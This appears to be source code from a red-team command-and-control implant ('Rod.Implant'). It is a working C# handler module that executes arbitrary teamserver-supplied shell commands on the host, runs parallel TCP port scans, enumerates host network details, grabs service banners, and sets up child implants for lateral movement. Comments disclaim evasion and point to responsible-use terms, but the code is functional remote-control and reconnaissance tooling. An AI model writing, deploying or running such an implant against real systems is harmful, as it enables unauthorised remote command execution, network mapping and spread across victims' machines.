using System.Collections.Concurrent;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Rod.V1;

namespace Rod.Implant.Internal;

// Holds the core-category handlers the reference implant registers in its
// handler registry (architecture.md Sec 5.3, Sec 10.1): shell.exec, and the
// recon.portscan / recon.hostenum / recon.service recon verbs. Each is a plain
// static method; the registry registers it as a CapabilityHandler in
// HandlerRegistry.Default, so dispatch never reaches a hard-coded switch here.
//
// These are benign reference handlers: they shell out to the platform shell
// and documented administration tools only. They perform no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7); the operator is responsible for targeting only systems they are
// authorized to test (RESPONSIBLE-USE.md).

/// <summary>
/// Carries the inputs the lateral.move handler needs to derive a child implant
/// that enrolls back against the same teamserver (architecture.md Sec 10.1). The
/// parent's own stager token is already spent at this implant's enroll, so the
/// child token arrives in the lateral.move arguments; the bundle here is the
/// enroll endpoint, CA pin, transport profile, and the parent's own implant id
/// (named as the child's parent). A null bundle leaves derivation disabled.
/// </summary>
internal sealed class EnrollBundle
{
    public required string Url { get; init; }
    public required string ParentId { get; init; }
    public required TransportProfile Profile { get; init; }

    /// <summary>
    /// The teamserver CA(s) to pin at enroll, or null to trust the system roots.
    /// </summary>
    public X509Certificate2Collection? CAs { get; init; }
}

/// <summary>
/// The core-category handlers. Each Dispatch call runs an independent process or
/// its own socket set, so concurrent invocations are safe.
/// </summary>
internal static class Core
{
    // Per-port dial timeout for the network-touching recon verbs. Short so a
    // wide port range finishes promptly; long enough that a reachable port on a
    // quiet host completes its handshake.
    private static readonly TimeSpan DialTimeout = TimeSpan.FromMilliseconds(300);

    // How long a service-probe waits for a banner after connecting.
    private static readonly TimeSpan BannerTimeout = TimeSpan.FromMilliseconds(500);

    // The shell.exec task budget: a command that outlives it is killed so a
    // hung task cannot block the beacon's dispatch loop indefinitely (dispatch
    // runs synchronously on the beacon stream).
    private static readonly TimeSpan ShellTimeout = TimeSpan.FromMinutes(5);

    // Runs the argument string through the platform shell and returns the combined
    // output. A non-zero exit is a Failed outcome with the output captured so the
    // operator sees the cause; the shell itself failing to start is also Failed;
    // a command that outlives the task budget is killed whole-tree and reported
    // as timed out.
    public static (TaskOutcome, string) ShellExec(string command)
    {
        var (shell, flag) = PlatformShell();
        var psi = new ProcessStartInfo
        {
            FileName = shell,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        psi.ArgumentList.Add(flag);
        psi.ArgumentList.Add(command);

        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, "failed to start shell");

            // Drain the pipes concurrently with the wait: a command that fills
            // the pipe buffer while running blocks on write, so a synchronous
            // ReadToEnd-before-WaitForExit would deadlock instead of timing out.
            var stdout = process.StandardOutput.ReadToEndAsync();
            var stderr = process.StandardError.ReadToEndAsync();

            if (!process.WaitForExit((int)ShellTimeout.TotalMilliseconds))
            {
                process.Kill(entireProcessTree: true);
                process.WaitForExit(5000);
                return (TaskOutcome.Failed, $"shell.exec timed out after {(int)ShellTimeout.TotalMinutes} minutes");
            }

            // The process has exited, so both drains have completed (the pipes
            // closed); the sync wait below never blocks.
            var output = ComposeOutput(stdout.GetAwaiter().GetResult(), stderr.GetAwaiter().GetResult());
            if (process.ExitCode != 0)
                return (TaskOutcome.Failed, output.Length > 0 ? output : $"exit code {process.ExitCode}");
            return (TaskOutcome.Succeeded, output);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    // recon.portscan dials each TCP port in "start-end" on the host and reports
    // one line per open port ("<host>:<port> open"). Arguments are
    // "<host> <start-end>". Malformed arguments yield Failed; a closed range
    // yields Succeeded with empty output.
    //
    // Dials run with bounded parallelism: a sequential 300ms-timeout sweep of a
    // 65k range would take hours, while a few hundred concurrent connects keep
    // it in the minutes without exhausting the socket pool. The degree is a
    // deliberately conservative ceiling, not a tuning knob.
    private const int ScanParallelism = 256;

    public static (TaskOutcome, string) PortScan(string arguments)
    {
        if (!TryParseScanArgs(arguments, out var host, out var startPort, out var endPort))
            return (TaskOutcome.Failed, "recon.portscan expects '<host> <start-end>'");

        var open = new ConcurrentQueue<int>();
        Parallel.For(
            startPort,
            endPort + 1,
            new ParallelOptions { MaxDegreeOfParallelism = ScanParallelism },
            port =>
            {
                if (IsPortOpen(host, port))
                    open.Enqueue(port);
            });

        var lines = open.OrderBy(port => port).Select(port => $"{host}:{port} open");
        return (TaskOutcome.Succeeded, string.Join("\n", lines));
    }

    // recon.hostenum reports local host facts: hostname, OS/arch, and the
    // non-loopback unicast addresses on each interface. It introspects the
    // running host and never probes a remote one, so the optional argument is
    // informational only.
    public static (TaskOutcome, string) HostEnum(string arguments)
    {
        var sb = new StringBuilder();
        sb.Append("hostname=").AppendLine(TryHostName(out var hostname) ? hostname : "(unknown)");
        sb.Append("os=").Append(RuntimeInformation.OSDescription).Append('\n');
        sb.Append("arch=").AppendLine(RuntimeInformation.OSArchitecture.ToString().ToLowerInvariant());

        IPAddress[] unicast;
        try
        {
            unicast = NetworkInterface.GetAllNetworkInterfaces()
                .Where(IsUpNonLoopback)
                .SelectMany(i => i.GetIPProperties().UnicastAddresses)
                .Where(a => a.Address.AddressFamily is AddressFamily.InterNetwork
                            or AddressFamily.InterNetworkV6)
                .Select(a => a.Address)
                .Where(ip => !IPAddress.IsLoopback(ip))
                .ToArray();
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "host enum failed to list interfaces: " + ex.Message);
        }

        foreach (var ip in unicast)
            sb.Append("ip=").AppendLine(ip.ToString());

        return (TaskOutcome.Succeeded, sb.ToString().TrimEnd('\n'));
    }

    // recon.service dials each listed port on the host, reads a short banner from
    // an open port, and reports one line per port as "<host>:<port> <banner>".
    // Arguments are "<host> <port[,port2,...]>". The outcome is Succeeded if at
    // least one port was open, Failed otherwise.
    public static (TaskOutcome, string) ServiceProbe(string arguments)
    {
        if (!TryParseServiceArgs(arguments, out var host, out var ports))
            return (TaskOutcome.Failed, "recon.service expects '<host> <port[,port2,...]>'");

        var lines = new List<string>();
        foreach (var port in ports)
        {
            var (banner, open) = ProbeService(host, port);
            if (!open)
                continue;
            lines.Add($"{host}:{port} {(string.IsNullOrEmpty(banner) ? "open" : banner)}");
        }

        if (lines.Count == 0)
            return (TaskOutcome.Failed, $"no open ports on {host}");
        return (TaskOutcome.Succeeded, string.Join("\n", lines));
    }

    // The shell and its command flag for shell.exec on the current OS. Linux/macOS
    // use sh -c; Windows uses cmd /c.
    private static (string Shell, string Flag) PlatformShell()
        => OperatingSystem.IsWindows() ? ("cmd.exe", "/c") : ("sh", "-c");

    // Joins stdout and stderr on a newline so a Failed outcome shows both, and a
    // Succeeded outcome carries whatever the shell printed.
    private static string ComposeOutput(string stdout, string stderr)
    {
        if (stdout.Length == 0)
            return stderr;
        if (stderr.Length == 0)
            return stdout;
        return stdout + "\n" + stderr;
    }

    // Splits "<host> <start-end>" and validates the range. Ports stay in
    // [1, 65535] and start <= end; the second token uses a hyphen separator to
    // match the documented argument format.
    private static bool TryParseScanArgs(string arguments, out string host, out int startPort, out int endPort)
    {
        host = string.Empty;
        startPort = 0;
        endPort = 0;
        var fields = arguments.Split(StringSeparators.Space, StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length != 2)
            return false;
        var range = fields[1].Split('-');
        if (range.Length != 2)
            return false;
        if (!int.TryParse(range[0], out startPort) || !int.TryParse(range[1], out endPort))
            return false;
        if (!IsValidPort(startPort) || !IsValidPort(endPort) || startPort > endPort)
            return false;
        host = fields[0];
        return true;
    }

    // Splits "<host> <port[,port2,...]>" into the host and a validated port list.
    private static bool TryParseServiceArgs(string arguments, out string host, out int[] ports)
    {
        host = string.Empty;
        ports = Array.Empty<int>();
        var fields = arguments.Split(StringSeparators.Space, StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length != 2)
            return false;
        var tokens = fields[1].Split(',');
        var parsed = new List<int>(tokens.Length);
        foreach (var tok in tokens)
        {
            if (!int.TryParse(tok.Trim(), out var port) || !IsValidPort(port))
                return false;
            parsed.Add(port);
        }
        if (parsed.Count == 0)
            return false;
        host = fields[0];
        ports = parsed.ToArray();
        return true;
    }

    // Reports whether a TCP port accepts a connection within the recon dial
    // timeout. A refused or timed-out connect is simply closed.
    private static bool IsPortOpen(string host, int port)
    {
        try
        {
            using var client = new TcpClient();
            if (!client.ConnectAsync(host, port).Wait(DialTimeout) || !client.Connected)
                return false;
            return true;
        }
        catch
        {
            return false;
        }
    }

    // Dials a port and, on success, reads a short banner. Returns the banner
    // (trimmed) and whether the port was open. A read that times out still
    // counts as open with no banner, since many services wait for the client to
    // speak first.
    private static (string Banner, bool Open) ProbeService(string host, int port)
    {
        TcpClient? client = null;
        try
        {
            client = new TcpClient();
            if (!client.ConnectAsync(host, port).Wait(DialTimeout) || !client.Connected)
                return (string.Empty, false);

            client.ReceiveTimeout = (int)BannerTimeout.TotalMilliseconds;
            using var stream = client.GetStream();
            var buffer = new byte[256];
            var read = stream.Read(buffer, 0, buffer.Length);
            return (read > 0 ? Encoding.ASCII.GetString(buffer, 0, read).TrimEnd('\r', '\n') : string.Empty, true);
        }
        catch
        {
            // A connect that refused/ timed out is closed; a read failure after
            // a successful connect is treated as open with no banner, matching
            // the documented behavior.
            return client is { Connected: true } ? (string.Empty, true) : (string.Empty, false);
        }
        finally
        {
            client?.Dispose();
        }
    }

    // A network interface worth enumerating for hostenum: it is up and is not a
    // loopback or tunnel-only adapter.
    private static bool IsUpNonLoopback(NetworkInterface iface)
        => iface.OperationalStatus == OperationalStatus.Up
           && iface.NetworkInterfaceType != NetworkInterfaceType.Loopback;

    // Wraps Dns.GetHostName, which can throw on some hosts.
    private static bool TryHostName(out string hostname)
    {
        try
        {
            hostname = Dns.GetHostName();
            return true;
        }
        catch
        {
            hostname = string.Empty;
            return false;
        }
    }

    // The inclusive TCP port range.
    private static bool IsValidPort(int port) => port is >= 1 and <= 65535;

    private static class StringSeparators
    {
        public static readonly char[] Space = { ' ' };
    }
}
